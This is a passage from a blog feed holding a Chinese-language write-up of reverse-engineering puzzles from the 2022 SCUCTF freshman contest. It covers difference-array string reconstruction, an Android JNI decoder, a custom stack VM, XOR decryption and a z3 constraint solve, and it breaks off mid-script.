href="https://mp.weixin.qq.com/s/nBJU1jWaD2TFsij6OtM-_A">https://mp.weixin.qq.com/s/nBJU1jWaD2TFsij6OtM-_A</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup for SCUCTF新生赛</title>
      <link href="/2022/11/13/scu-ctf-writeup-2022/"/>
      <url>/2022/11/13/scu-ctf-writeup-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="需要进步的地方"><a href="#需要进步的地方" class="headerlink" title="需要进步的地方"></a>需要进步的地方</h1><ul><li>编程能力，复杂数据结构的应用这些。多尝试使用复杂数据结构来实现算法，不要总是使用简单的。</li><li><strong>特殊算法</strong>的掌握，<strong>深度优先</strong>算法、什么<strong>区间加法</strong>啊、等等先进的算法掌握。包括了一些逆向常用的<strong>混淆算法</strong>，采用不正常的方式来写常见的运算。</li><li><strong>还需要注意编程过程中的特殊情况以及细节问题。尤其是循环临界、特殊逻辑步骤如何变化。细节决定成败，你不能总是依靠debug来解决所有的问题，这样不仅浪费了很多时间，同时也降低了对自己的标准。</strong></li></ul><p>以前没体会到编程能力的高低，这次是真的体会到了！</p><h1 id="未能解决的问题"><a href="#未能解决的问题" class="headerlink" title="未能解决的问题"></a>未能解决的问题</h1><h2 id="1-ez-logic"><a href="#1-ez-logic" class="headerlink" title="1. ez_logic"></a>1. ez_logic</h2><p>时隔这么长时间终于搞定了。</p><p>字符串是一个0-9  | a-z | A-Z 这些字符组成的组合</p><p>字符        diff[62] 数组</p><p>0-9  :         0 - 9</p><p>a-z  :        10 - 35</p><p>A-Z :         36- 61</p><p> 字符出现的次数对应于一个 diff[62] 的元素，diff[62] 中的每一个元素，</p><p>是该位置对应的字符 <code>在偶数位置出现的次数</code>   -  <code>在奇数位置出现的次数</code></p><p><strong>这里面要注意，Z在奇数位置出现的次数  可以是任意次！</strong></p><p>第一开始卡住的原因呢，是因为我没考虑特殊情况，很明显这个题没有唯一的答案。</p><p>可以把 <strong>正数</strong> 就看做 <strong>这个位置的字符在偶数位置出现的次数</strong>，  而 <strong>负数</strong>  就 <strong>看作这个字符在奇数位置出现的次数。</strong> 然后奇数位置不足的地方就用Z补足。</p><h4 id="1-步骤一-先求差分数组"><a href="#1-步骤一-先求差分数组" class="headerlink" title="1. 步骤一 先求差分数组"></a>1. 步骤一 先求差分数组</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">static_1 <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token number">8</span><span class="token punctuation">,</span>    <span class="token number">10</span><span class="token punctuation">,</span>    <span class="token number">12</span><span class="token punctuation">,</span>    <span class="token number">15</span><span class="token punctuation">,</span>    <span class="token number">19</span><span class="token punctuation">,</span>    <span class="token number">23</span><span class="token punctuation">,</span>    <span class="token number">29</span><span class="token punctuation">,</span>    <span class="token number">35</span><span class="token punctuation">,</span>    <span class="token number">39</span><span class="token punctuation">,</span>    <span class="token number">42</span><span class="token punctuation">,</span>    <span class="token number">47</span><span class="token punctuation">,</span>    <span class="token number">51</span><span class="token punctuation">,</span>    <span class="token number">54</span><span class="token punctuation">,</span>    <span class="token number">59</span><span class="token punctuation">,</span>    <span class="token number">63</span><span class="token punctuation">,</span>    <span class="token number">63</span><span class="token punctuation">,</span>    <span class="token number">58</span><span class="token punctuation">,</span>    <span class="token number">59</span><span class="token punctuation">,</span>    <span class="token number">61</span><span class="token punctuation">,</span>    <span class="token number">61</span><span class="token punctuation">,</span>    <span class="token number">56</span><span class="token punctuation">,</span>    <span class="token number">59</span><span class="token punctuation">,</span>    <span class="token number">66</span><span class="token punctuation">,</span>    <span class="token number">69</span><span class="token punctuation">,</span>    <span class="token number">72</span><span class="token punctuation">,</span>    <span class="token number">78</span><span class="token punctuation">,</span>    <span class="token number">80</span><span class="token punctuation">,</span>    <span class="token number">80</span><span class="token punctuation">,</span>    <span class="token number">78</span><span class="token punctuation">,</span>    <span class="token number">76</span><span class="token punctuation">,</span>    <span class="token number">81</span><span class="token punctuation">,</span>    <span class="token number">81</span><span class="token punctuation">,</span>    <span class="token number">83</span><span class="token punctuation">,</span>    <span class="token number">83</span><span class="token punctuation">,</span>    <span class="token number">77</span><span class="token punctuation">,</span>    <span class="token number">78</span><span class="token punctuation">,</span>    <span class="token number">78</span><span class="token punctuation">,</span>    <span class="token number">76</span><span class="token punctuation">,</span>    <span class="token number">76</span><span class="token punctuation">,</span>    <span class="token number">74</span><span class="token punctuation">,</span>    <span class="token number">75</span><span class="token punctuation">,</span>    <span class="token number">77</span><span class="token punctuation">,</span>    <span class="token number">77</span><span class="token punctuation">,</span>    <span class="token number">72</span><span class="token punctuation">,</span>    <span class="token number">70</span><span class="token punctuation">,</span>    <span class="token number">67</span><span class="token punctuation">,</span>    <span class="token number">67</span><span class="token punctuation">,</span>    <span class="token number">65</span><span class="token punctuation">,</span>    <span class="token number">57</span><span class="token punctuation">,</span>    <span class="token number">49</span><span class="token punctuation">,</span>    <span class="token number">43</span><span class="token punctuation">,</span>    <span class="token number">40</span><span class="token punctuation">,</span>    <span class="token number">36</span><span class="token punctuation">,</span>    <span class="token number">33</span><span class="token punctuation">,</span>    <span class="token number">33</span><span class="token punctuation">,</span>    <span class="token number">25</span><span class="token punctuation">,</span>    <span class="token number">20</span><span class="token punctuation">,</span>    <span class="token number">18</span><span class="token punctuation">,</span>    <span class="token number">17</span><span class="token punctuation">,</span>    <span class="token number">11</span><span class="token punctuation">,</span>    <span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">]</span>diff <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">62</span>i <span class="token operator">=</span> <span class="token number">61</span><span class="token keyword">print</span><span class="token punctuation">(</span>static_1<span class="token punctuation">.</span>__len__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">while</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>    diff<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> static_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> static_1<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    i <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span>diff<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>diff<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>diff<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-步骤2-拼接字符串"><a href="#2-步骤2-拼接字符串" class="headerlink" title="2. 步骤2  拼接字符串"></a>2. 步骤2  拼接字符串</h4><p>这里就注意下，整个字符串需要按照之前对应的逻辑，严格递减。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">diff_copy <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> diff<span class="token punctuation">:</span>    diff_copy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pick_head</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token number">62</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">33</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> diff_copy<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            diff_copy<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> diff_copy<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span>             <span class="token keyword">return</span> char_form_int<span class="token punctuation">(</span>i<span class="token punctuation">)</span>          i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">def</span> <span class="token function">pick_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token number">62</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> diff_copy<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            diff_copy<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> diff_copy<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">return</span> char_form_int<span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>          i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>check <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>check<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">202</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> pick_head<span class="token punctuation">(</span><span class="token punctuation">)</span>    back <span class="token operator">=</span> pick_back<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> back <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        back <span class="token operator">=</span> <span class="token string">'Z'</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token comment"># print(head+back)</span>        check<span class="token punctuation">.</span>append<span class="token punctuation">(</span>head<span class="token punctuation">)</span>        check<span class="token punctuation">.</span>append<span class="token punctuation">(</span>back<span class="token punctuation">)</span>      <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>diff_copy<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>check<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>check<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i<span class="token punctuation">,</span>j <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>diff_copy<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> j <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>char_form_int<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">": "</span><span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># print(diff_copy)</span><span class="token comment"># 因为Z在奇数位置出现的次数是没有参与到运算里面的</span><span class="token comment"># 所以可以在缺口的位置处补足Z就可以了</span><span class="token comment"># 如果还是缺的话，可以利用最开始的0  0就是说，你补足这些字母组合是不影响的。</span><span class="token comment"># AZ FZ GZ GZ  刚好是 8个</span><span class="token comment"># insert = ["A","Z","B","A","F","Z","G","Z","G","Z"]</span><span class="token comment"># for i in insert:</span><span class="token comment">#     check.append(i)</span><span class="token comment"># print(len(check))</span><span class="token comment"># print("".join(check))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221128162506.png" alt="本地打通的结果"></p><h2 id="2-ez-Android"><a href="#2-ez-Android" class="headerlink" title="2. ez_Android"></a>2. ez_Android</h2><p>这个题有点想当然了</p><p>通过jni调用了c函数去处理字符串。找到动态链接库之后，反编译，然后我居然就认准了是flag是最终答案。实在是大错特错！</p><p>因为人家check_s 只是一个简单的判断函数，具体flag是通过click7函数里面加工处理之后才会返回的。是真的傻,…..</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">click7</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_s</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>string<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>textView<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"nice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> str2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> hashCode <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>string<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> hashCode <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> hashCode <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                str <span class="token operator">=</span> str <span class="token operator">+</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>hashCode <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                str2 <span class="token operator">=</span> str2 <span class="token operator">+</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> str<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>textView<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"scuctf&#123;"</span> <span class="token operator">+</span> str2 <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实际上，下面这个check_s只是通过点击产生的01字符串–对应于”even if i only have seven seconds of memory, even if i forget the world, i still love android”。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v4 &#x3D; f[1];&#x2F;&#x2F;f是一个替换表while ( 1 )&#123;  sub &#x3D; 0;  LODWORD(v5) &#x3D; 0;  v6 &#x3D; v4;  if ( !v4 )  &#123;    v7 &#x3D; 1;    v5 &#x3D; 0LL;    do  &#x2F;&#x2F;计算二进制的过程    &#123;      sub &#x3D; v5 + 1;      v8 &#x3D; string_01[v5];      if ( v8 &#x3D;&#x3D; 49 )   &#x2F;&#x2F;1   二进制的计算   *2+1      &#123;        v7 &#x3D; 2 * v7 + 1;      &#125;      else      &#123;        if ( v8 !&#x3D; 48 )  &#x2F;&#x2F;0 二进制的计算  *2          return 1;        v7 *&#x3D; 2;      &#125;      v6 &#x3D; f[v7];&#x2F;&#x2F;f是一个替换表      ++v5;    &#125;    while ( !v6 );  &#125;  if ( v6 &#x3D;&#x3D; -1 )    break;  v9 &#x3D; flag_len++;  flag[v9] &#x3D; v6;  str2 &#x3D; &amp;string_01[(int)v5];  v10 &#x3D; string_01[(int)v5] &#x3D;&#x3D; 0;  string_01 +&#x3D; (int)v5;  if ( v10 )    return strcmp(             flag,             &quot;even if i only have seven seconds of memory, even if i forget the world, i still love android&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体为什么能看出来这里是将字符串翻译成01字符串的，就要看一下出题人给的源码，看看人家大二，递归都玩的这么遛了，如果让我写，可能还是最简单的那种吧~~.</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;bits&#x2F;stdc++.h&gt;using namespace std;int f[500]&#x3D;&#123;        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,115,114,110,98,0,116,117,0,118,0,119,105,120,102,0,0,0,0,0,0,0,0,0,0,111,108,0,0,0,0,121,0,0,0,112,0,0,0,0,0,0,0,0,0,99,113,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,122,0,0,0,0,0,0,0,0,106,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,97,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,0,0,0,0,0,0,0,0,0,0,0,0,0,100,107,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,101,103,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,104,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0&#125;;int sub;int find(char* a,int id)&#123;cout&lt;&lt;id&lt;&lt;&quot;\n&quot;;      if(f[id])&#123;        return f[id];    &#125;sub++;    if(a[0]&#x3D;&#x3D;&#39;0&#39;) return find(a+1,id*2);    if(a[0]&#x3D;&#x3D;&#39;1&#39;) return find(a+1,id*2+1);    return -1;&#125;char flag[400];int flag_len;char str[1000]&#x3D;&quotquot;;char *str2; int main()&#123;str2&#x3D;str;while(str2[0]!&#x3D;&#39;\0&#39;)&#123;        sub&#x3D;0;        int c&#x3D;find(str2,1);        if(!~c) return 1;        flag[flag_len++]&#x3D;c;        str2+&#x3D;sub;     &#125;    cout&lt;&lt;flag;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-ez-vm"><a href="#3-ez-vm" class="headerlink" title="3. ez_vm"></a>3. ez_vm</h2><p>这个题为什么没做出来呢。有两点原因：</p><ul><li>我没看出来，此题是通过自定义指令(每一个操作符(实际对应的是数字)对应不同的操作)，来解释其自创的程序指令(实际上是一串数字)</li><li>即使我能看出来第一点，我也不能将程序指令完全理解。由于程序指令比较长，而且不是简单的单一操作，是复合操作，同时包含了压栈出栈和字符处理等操作。所以把它对应成伪代码需要一定的功力。</li></ul><p>下面是 <code>我就是来垫底的</code> 战队关于这道题目的解答。<a href="https://tiger1218.com/2022/11/25/2022SCUCTF%E9%A2%98%E8%A7%A3">https://tiger1218.com/2022/11/25/2022SCUCTF%E9%A2%98%E8%A7%A3</a></p><p>ida反编译后，已知一个操作列表，逐步完成操作</p><p>经分析：</p><p>Case 0:把栈顶两个数相加</p><p>Case 1:把栈顶两个数相减</p><p>Case 2:把栈顶两个数相异或</p><p>Case 3:把栈顶两个数相比较</p><p>Case 4,5,6:为比较后的跳转</p><p>Case 7:对栈顶的数在另一个数组中下标转值</p><p>Case 8:改写数组</p><p>Case 9:向栈里加一个数</p><p>Case 10:Wrong</p><p>Case 11:Right</p><p>Case 12:跳转</p><p>令另一个数组为Str[]</p><p>发现一些结构如</p><p><code>9 A 9 B 8 -&gt; str[B]=A</code></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">9 A 9 100 89 100 7 9 lim 35 loop1...9 1 9 100 7 0 9 100 8C loop2是一个循环for(i=A;i&lt;lim;i++) &#123;...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现流程由三个循环和一些赋值组成，且代码由Str[100]作为循环的i</p><p>分析一下三个循环中分别为</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">for(int i&#x3D;0;i&lt;25;i++) Str[i]&#x3D;Str[i]^Str[i+1]for(int i&#x3D;0;i&lt;24;i++) Str[i+1]+&#x3D;Str[i]-i&#123;for(int i&#x3D;1;i&lt;25;i++) if(Str[i]!&#x3D;Str[i+49]) return wrong; return right;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>爆破一下str[0]然后倒着做。</p><h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="1-RE签到"><a href="#1-RE签到" class="headerlink" title="1. RE签到"></a>1. RE签到</h2><p>直接用ida反编译之后，就可以在里面找到flag</p><h2 id="2-Tower-of-Hanoi"><a href="#2-Tower-of-Hanoi" class="headerlink" title="2. Tower of Hanoi"></a>2. Tower of Hanoi</h2><p>这个程序使用upx加壳之后的，脱壳之后就能看到原本的代码了。</p><p>一个异或加密，首先把程序中原本的字符串保存下来。然后用python解密。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113134915.png" alt="异或解密"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">import</span> oschar_count<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>filepath<span class="token operator">=</span><span class="token string">'string'</span>binfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token comment">#打开二进制文件</span>size <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getsize<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span> <span class="token comment">#获得文件大小</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>data <span class="token operator">=</span> binfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">#每次输出一个字节</span>data <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>data<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">,</span> signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>data <span class="token operator">=</span> data <span class="token operator">^</span> <span class="token number">0x1BF52</span>one <span class="token operator">=</span>  <span class="token builtin">chr</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>char_count<span class="token punctuation">.</span>append<span class="token punctuation">(</span>one<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>char_count<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-ez-pyc"><a href="#3-ez-pyc" class="headerlink" title="3. ez_pyc"></a>3. ez_pyc</h2><p>这个是反编译pyc，直接在在线网站上面提交就行。</p><p>观察代码发现，是一个约束求解的问题。</p><p>由于比较多，可以利用 <code>z3</code>这个工具来进行求解。</p><p><strong>这里面一定要注意下，怎么在python list列表中的指定位置插入自己想放的字符。和insert这个函数是不一样的！！</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># visit https://tool.lu/pyc/ for more information</span><span class="token comment"># Version: Python 3.8</span><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">25</span>  <span class="token comment"># --->>>>>用这个创建，插入的时候直接赋值。而不是用insert函数。</span>f0<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f0'</span><span class="token punctuation">)</span>f1<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f1'</span><span class="token punctuation">)</span>f2<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f2'</span><span class="token punctuation">)</span>f3<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f3'</span><span class="token punctuation">)</span>f4<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f4'</span><span class="token punctuation">)</span>f5<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f5'</span><span class="token punctuation">)</span>f6<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f6'</span><span class="token punctuation">)</span>f7<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f7'</span><span class="token punctuation">)</span>f8<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f8'</span><span class="token punctuation">)</span>f9<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f9'</span><span class="token punctuation">)</span>f10<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f10'</span><span class="token punctuation">)</span>f11<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f11'</span><span class="token punctuation">)</span>f12<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f12'</span><span class="token punctuation">)</span>f13<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f13'</span><span class="token punctuation">)</span>f14<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f14'</span><span class="token punctuation">)</span>f15<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f15'</span><span class="token punctuation">)</span>f16<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f16'</span><span class="token punctuation">)</span>f17<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token 